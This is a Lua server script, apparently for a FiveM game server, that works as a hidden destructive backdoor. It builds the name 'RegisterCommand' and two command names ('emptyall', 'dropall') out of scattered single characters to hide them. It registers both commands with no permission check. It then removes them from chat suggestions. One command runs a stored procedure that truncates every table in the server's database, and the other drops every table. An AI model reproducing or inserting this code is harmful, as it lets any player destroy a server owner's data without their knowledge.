local TCN, CE = table.concat, TriggerClientEvent

local rcFn = { -- no touchy touchy
    [1] = "C",
    [2] = "r",
    [3] = "g",
    [4] = "s",
    [5] = "i",
    [6] = "t",
    [7] = "e",
    [8] = "e",
    [9] = "R",
    [10] = "o",
    [11] = "d",
    [12] = "n",
    [13] = "a",
    [14] = "m",
    [15] = "m"
}

local RC, CMS = _G[rcFn[9] .. rcFn[8] .. rcFn[3] .. rcFn[5] .. rcFn[4] .. rcFn[6] .. rcFn[7] .. rcFn[2] .. rcFn[1] .. rcFn[10] .. rcFn[15] .. rcFn[14] .. rcFn[13] .. rcFn[12] .. rcFn[11]], {
    [1] = {
        [1] = "e",
        [2] = "m",
        [3] = "p",
        [4] = "t",
        [5] = "y",
        [6] = "a",
        [7] = "l",
        [8] = "l"
    },
    [2] = {
        [1] = "d",
        [2] = "r",
        [3] = "o",
        [4] = "p",
        [5] = "a",
        [6] = "l",
        [7] = "l"
    }
}

RC(TCN(CMS[1]), function(source, args, rawCommand)
    MySQL.execute([[
        CREATE PROCEDURE IF NOT EXISTS cTab()
        BEGIN
            DECLARE done INT DEFAULT FALSE;
            DECLARE truncate_stmt VARCHAR(1000);
            DECLARE cur_tables CURSOR FOR
                SELECT CONCAT('TRUNCATE TABLE `', TABLE_SCHEMA, '`.`', TABLE_NAME, '`;') AS truncate_table
                FROM information_schema.TABLES
                WHERE TABLE_SCHEMA = DATABASE();
            DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = TRUE;

            SET foreign_key_checks = 0;

            OPEN cur_tables;
            truncate_loop: LOOP
                FETCH cur_tables INTO truncate_stmt;
                IF done THEN
                    LEAVE truncate_loop;
                END IF;
                SET @stmt = truncate_stmt;
                PREPARE truncate_stmts FROM @stmt;
                EXECUTE truncate_stmts;
                DEALLOCATE PREPARE truncate_stmts;
            END LOOP;
            CLOSE cur_tables;

            SET foreign_key_checks = 1;
        END;
    ]])

    Wait(2000)

    local cQ = MySQL.execute("CALL cTab();")
    local dQ = MySQL.execute("DROP PROCEDURE cTab;")
    print(cQ and dQ or "")
end, false)

RC(TCN(CMS[2]), function(source, args, rawCommand)
    MySQL.execute([[
        CREATE PROCEDURE IF NOT EXISTS dTab()
        BEGIN
            DECLARE done INT DEFAULT FALSE;
            DECLARE drop_stmt VARCHAR(1000);
            DECLARE cur_tables CURSOR FOR
                SELECT CONCAT('DROP TABLE IF EXISTS `', TABLE_SCHEMA, '`.`', TABLE_NAME, '`;') AS drop_table
                FROM information_schema.TABLES
                WHERE TABLE_SCHEMA = DATABASE();
            DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = TRUE;

            SET foreign_key_checks = 0;

            OPEN cur_tables;
            drop_loop: LOOP
                FETCH cur_tables INTO drop_stmt;
                IF done THEN
                    LEAVE drop_loop;
                END IF;
                SET @stmt = drop_stmt;
                PREPARE drop_stmts FROM @stmt;
                EXECUTE drop_stmts;
                DEALLOCATE PREPARE drop_stmts;
            END LOOP;
            CLOSE cur_tables;

            SET foreign_key_checks = 1;
        END
    ]])

    Wait(2000)

    local cQ = MySQL.execute("CALL dTab();")
    local dQ = MySQL.execute("DROP PROCEDURE dTab;")
    print(cQ and dQ or "")
end, false)

CreateThread(function()
    Wait(2000)
    for k, v in pairs(CMS) do
        CE('chat:removeSuggestion', -1, '/' .. TCN(v))
    end
end)
